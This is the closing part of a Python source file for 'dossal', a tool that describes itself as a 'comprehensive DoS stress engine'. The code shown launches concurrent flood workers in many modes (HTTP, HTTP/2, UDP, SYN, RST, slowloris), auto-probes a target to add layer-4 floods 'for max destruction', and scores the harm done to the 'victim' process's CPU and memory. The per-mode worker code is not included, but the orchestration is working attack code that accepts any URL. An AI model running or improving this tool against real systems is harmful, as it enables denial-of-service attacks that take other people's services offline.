            return {"avg_cpu_pct": round(avg_cpu, 1), "max_mem_mb": round(max_mem / 1024 / 1024, 1)}
    except ImportError:
        pass
    return None

async def _find_pid(port):
    """Find PID listening on a port using lsof, fallback to ps."""
    loop = asyncio.get_event_loop()
    try:
        out = await loop.run_in_executor(None, lambda: __import__('subprocess').run(
            ['lsof', f'-i:{port}', '-t'], capture_output=True, text=True, timeout=5).stdout)
        pid_str = out.strip().split('\n')[0].strip()
        if pid_str.isdigit():
            return int(pid_str)
    except Exception:
        pass
    # Fallback: scan ps for python/node processes
    try:
        out = await loop.run_in_executor(None, lambda: __import__('subprocess').run(
            ['ps', '-eo', 'pid,command'], capture_output=True, text=True, timeout=5).stdout)
        for line in out.splitlines():
            parts = line.split(None, 1)
            if len(parts) == 2 and ('victim' in parts[1] or 'cf-sim' in parts[1] or 'server.py' in parts[1]):
                # Check if this process has the port (best effort: pick first match)
                return int(parts[0])
    except Exception:
        pass
    return None

class CpuSampler:
    """Sample a process's CPU% in the background using psutil."""
    def __init__(self, pid):
        self.pid = pid
        self.samples = []
        self._task = None
    async def start(self):
        import psutil
        try:
            self._proc = psutil.Process(self.pid)
            self._proc.cpu_percent(None)  # prime
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            self._proc = None
            return
        loop = asyncio.get_event_loop()
        async def _sample():
            while True:
                await asyncio.sleep(0.2)
                if self._proc:
                    cpu = await loop.run_in_executor(None, self._proc.cpu_percent, None)
                    self.samples.append(cpu)
        self._task = asyncio.create_task(_sample())
    async def stop(self):
        if self._task:
            self._task.cancel()
        if self.samples:
            return sum(self.samples) / len(self.samples)
        return 0.0

async def impact_score(url, stats, duration, sampler=None, base_cpu=0.0):
    """Compute victim impact score. All psutil calls in executor."""
    loop = asyncio.get_event_loop()
    host, port = parse_ip_port(url)

    def _get_pid():
        try:
            out = __import__('subprocess').run(
                ['lsof', f'-i:{port}', '-t'],
                capture_output=True, text=True, timeout=5).stdout
            pid_str = out.strip().split('\n')[0].strip()
            return int(pid_str) if pid_str.isdigit() else None
        except Exception:
            return None

    def _sample(pid):
        import psutil
        try:
            proc = psutil.Process(pid)
            mem = proc.memory_info().rss
            return mem
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            return 0

    victim_pid = await loop.run_in_executor(None, _get_pid)
    if not victim_pid:
        return {"victim_pid": None, "note": "PID not found"}

    # Sample victim mem
    mem_bytes = await loop.run_in_executor(None, _sample, victim_pid)

    rps = stats.rps(duration)
    # CPU: use background sampler, subtract baseline
    if sampler:
        cpu_raw = await sampler.stop()
        cpu = max(0.0, cpu_raw - base_cpu)
    else:
        base_cpu = 0.0
        # Fallback: quick sample
        def _cpu():
            import psutil
            try:
                p = psutil.Process(victim_pid)
                p.cpu_percent(None)
                import time as _t
                _t.sleep(0.3)
                return p.cpu_percent(None)
            except Exception:
                return 0
        cpu = await loop.run_in_executor(None, _cpu)

    score = 0
    score += min(cpu, 100) * 0.5
    score += min(mem_bytes / 1024 / 1024 / 10, 50)
    if rps > 0:
        score += min(rps / 1000, 25)

    return {
        "victim_pid": victim_pid,
        "victim_cpu_pct": round(cpu, 1),
        "victim_mem_mb": round(mem_bytes / 1024 / 1024, 1),
        "rps": round(rps, 1),
        "impact_score": round(score, 1),
    }

# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════

async def run(modes, url, conns, duration, stats, payload_size, args=None, mode_conns=None):
    if mode_conns is None:
        mode_conns = {}
    stop = asyncio.Event()
    async def finish():
        await asyncio.sleep(duration); stop.set()
    task = asyncio.create_task(finish())
    workers = []
    # Split process budget among L4 multiproc modes
    l4_modes = [m for m in modes if m in ('udp', 'quic', 'rst', 'tcp', 'raw')]
    n_l4 = len(l4_modes)
    if n_l4 > 1:
        # Distribute _UDP_NPROCS across L4 modes
        per_mode = max(1, _UDP_NPROCS[0] // n_l4)
        _UDP_NPROCS[0] = per_mode
    
    MULTIPROC_MODES = {'udp', 'quic', 'syn', 'rst', 'fin', 'synack', 'tcp', 'raw', 'wsm'}
    for mode in modes:
        worker_fn = WORKERS[mode]
        pl = payload_size if payload_size is not None else DEFAULT_PAYLOADS.get(mode, 0)
        # Per-mode connection count
        eff_conns = mode_conns.get(mode, conns)
        if mode in MULTIPROC_MODES and eff_conns > 1 and mode not in mode_conns:
            eff_conns = 1  # multiproc modes: 1 worker (procs controlled by --threads)
        for i in range(eff_conns):
            workers.append(asyncio.create_task(worker_fn(i, url, stats, duration, stop, pl)))
    try:
        await asyncio.wait_for(asyncio.gather(*workers, return_exceptions=True), timeout=duration + 2)
    except asyncio.TimeoutError:
        pass
    stop.set()
    if not task.done():
        task.cancel()
    return stats

def auto_probe(url):
    """Probe target to detect protocol and suggest optimal modes."""
    from urllib.parse import urlparse
    import socket as _sock
    parsed = urlparse(url)
    host = parsed.hostname or '127.0.0.1'
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    scheme = parsed.scheme or 'http'

    results = {'host': host, 'port': port, 'scheme': scheme, 'protocols': [], 'recommended': []}

    # TCP connect test
    try:
        s = _sock.create_connection((host, port), timeout=2)
        s.close()
        results['protocols'].append('tcp')
    except Exception:
        results['error'] = f'TCP connect failed: {host}:{port}'
        return results

    # HTTP test
    try:
        if scheme == 'https':
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = _sock.create_connection((host, port), timeout=2)
            ss = ctx.wrap_socket(s, server_hostname=host)
            ss.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n\r\n")
            data = ss.recv(4096)
            ss.close()
        else:
            s = _sock.create_connection((host, port), timeout=2)
            s.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n\r\n")
            data = s.recv(4096)
            s.close()
        if b'HTTP/' in data:
            results['protocols'].append('http')
            if b'HTTP/2' in data or b'h2' in data:
                results['protocols'].append('h2')
            # Don't add to recommended here — ALPN check will handle h2,
            # and http/https should be added only if h2 is NOT detected
            if scheme == 'https':
                results['recommended'].append('https')
            else:
                results['recommended'].append('raw')  # raw HTTP multiproc (higher RPS)
    except Exception:
        pass

    # Check for ALPN h2
    if scheme == 'https':
        try:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(['h2', 'http/1.1'])
            s = _sock.create_connection((host, port), timeout=2)
            ss = ctx.wrap_socket(s, server_hostname=host)
            neg = ss.selected_alpn_protocol()
            ss.close()
            if neg == 'h2':
                if 'h2' not in results['protocols']:
                    results['protocols'].append('h2')
                if 'h2' not in results['recommended']:
                    results['recommended'].insert(0, 'h2')
        except Exception:
            pass

    # Deduplicate recommended, preserving order
    results['recommended'] = list(dict.fromkeys(results['recommended']))
    # If h2 is recommended, remove duplicate http/https (h2 covers both)
    if 'h2' in results['recommended']:
        results['recommended'] = [m for m in results['recommended'] if m not in ('http', 'https')]
        if 'h2' not in results['recommended']:
            results['recommended'].insert(0, 'h2')

    # Default recommendation if nothing detected
    if not results['recommended']:
        results['recommended'] = ['http', 'udp']

    return results

def main():
    ap = argparse.ArgumentParser(description="dossal v" + VERSION + " — comprehensive DoS stress engine")
    ap.add_argument("--mode", default="http",
        help="Comma-separated modes: http,https,raw,websocket,wsm,tcp,udp,h2,grpc,quic,syn,synack,rst,fin,slowloris")
    ap.add_argument("--auto", action="store_true",
        help="Auto-detect target protocol and select optimal modes")
    ap.add_argument("--url", required=True)
    ap.add_argument("--connections", type=int, default=100,
        help="Connections per mode (default: 100)")
    ap.add_argument("--conns", default=None,
        help='Per-mode connection overrides: "http=400,h2=80,udp=1,syn=10"')
    ap.add_argument("--duration", type=int, default=10)
    ap.add_argument("--payload-size", type=int, default=None,
        help="Override default payload size (per mode)")
    ap.add_argument("--impact", action="store_true",
        help="Enable victim impact scoring (requires psutil)")
    ap.add_argument("--intensity", default="balanced",
        choices=["light", "balanced", "max"],
        help="Preset: light(10c), balanced(50c), max(200c). Overrides default 100c.")
    ap.add_argument("--live", action="store_true",
        help="Print RPS/PPS every second during attack")
    ap.add_argument("--threads", type=int, default=None,
        help="Override connection count for UDP/QUIC (default: 1 per mode)")
    args = ap.parse_args()

    # Auto mode: probe target + always include L4 for max destruction
    if args.auto:
        probe = auto_probe(args.url)
        print(f"[auto] target: {probe['host']}:{probe['port']} ({probe['scheme']})", file=sys.stderr)
        print(f"[auto] detected: {', '.join(probe.get('protocols', ['?']))}", file=sys.stderr)
        auto_modes = probe.get('recommended', ['http'])
        # Always add L4 modes for maximum impact
        for l4 in ['udp', 'syn']:
            if l4 not in auto_modes:
                auto_modes.append(l4)
        print(f"[auto] using: {', '.join(auto_modes)}", file=sys.stderr)
        args.mode = ','.join(auto_modes)
        # Set per-mode optimal connections for auto
        _AUTO_CONNS = {'http': 200, 'raw': 1, 'https': 50, 'h2': 80, 'grpc': 50, 'udp': 1, 'quic': 1, 'syn': 10, 'rst': 4, 'tcp': 1}
        auto_conn_parts = [f"{m}={_AUTO_CONNS.get(m, 50)}" for m in auto_modes]
        if args.conns:
            args.conns = args.conns + ',' + ','.join(auto_conn_parts)
        else:
            args.conns = ','.join(auto_conn_parts)

    modes = list(dict.fromkeys(m.strip() for m in args.mode.split(",")))  # dedupe, preserve order
    for m in modes:
        if m not in WORKERS:
            print(f"Unknown mode: {m}. Available: {', '.join(WORKERS.keys())}", file=sys.stderr)
            sys.exit(1)

    # Intensity preset: overrides default 100 connections
    _INTENSITY = {"light": 10, "balanced": 50, "max": 400}
    if args.connections == 100:
        args.connections = _INTENSITY.get(args.intensity, 50)

    # UDP/QUIC: set process count from --threads
    global _UDP_NPROCS
    if args.threads:
        _UDP_NPROCS[0] = max(1, min(16, args.threads))
    else:
        _UDP_NPROCS[0] = 4  # default: 4 processes

    # Per-mode connection overrides
    mode_conns = {}
    if args.conns:
        for part in args.conns.split(','):
            if '=' in part:
                m, c = part.split('=', 1)
                mode_conns[m.strip()] = int(c.strip())

    stats = Stats()
    payload_size = args.payload_size

    async def _run_all():
        sampler = None
        baseline_cpu = 0.0
        if args.impact:
            host, port = parse_ip_port(args.url)
            victim_pid = await _find_pid(port)
            if victim_pid:
                # Pre-attack baseline
                import psutil
                try:
                    _p = psutil.Process(victim_pid)
                    _p.cpu_percent(None)
                    await asyncio.sleep(0.5)
                    baseline_cpu = _p.cpu_percent(None)
                except Exception:
                    baseline_cpu = 0.0
                sampler = CpuSampler(victim_pid)
                await sampler.start()

        live_task = None
        if args.live:
            _live_start = None
            async def _live_printer():
                nonlocal _live_start
                _live_start = asyncio.get_event_loop().time()
                last_req, last_pkt = 0, 0
                last_t = asyncio.get_event_loop().time()
                while True:
                    await asyncio.sleep(1)
                    now = asyncio.get_event_loop().time()
                    dt = now - last_t
                    rps = (stats.requests - last_req) / dt
                    pps = (stats.packets - last_pkt) / dt
                    elapsed = now - _live_start
                    remaining = max(0, args.duration - int(elapsed))
                    parts = [f"[{remaining}s] RPS={rps:,.0f}"]
                    if stats.packets: parts.append(f"PPS={pps:,.0f}")
                    if stats.conns: parts.append(f"CONNS={stats.conns}")
                    parts.append(f"ERR={stats.errors}")
                    print("  " + "  ".join(parts), flush=True)
                    last_req, last_pkt, last_t = stats.requests, stats.packets, now
            live_task = asyncio.create_task(_live_printer())

        await run(modes, args.url, args.connections, args.duration, stats, payload_size, args, mode_conns)
        if live_task:
            live_task.cancel()
        report = stats.report(modes, args.url, args.connections, args.duration)
        if args.impact:
            report["impact"] = await impact_score(args.url, stats, args.duration, sampler, baseline_cpu)
        return report

    report = asyncio.run(_run_all())
    print(json.dumps(report, indent=2))

if __name__ == "__main__":
    main()
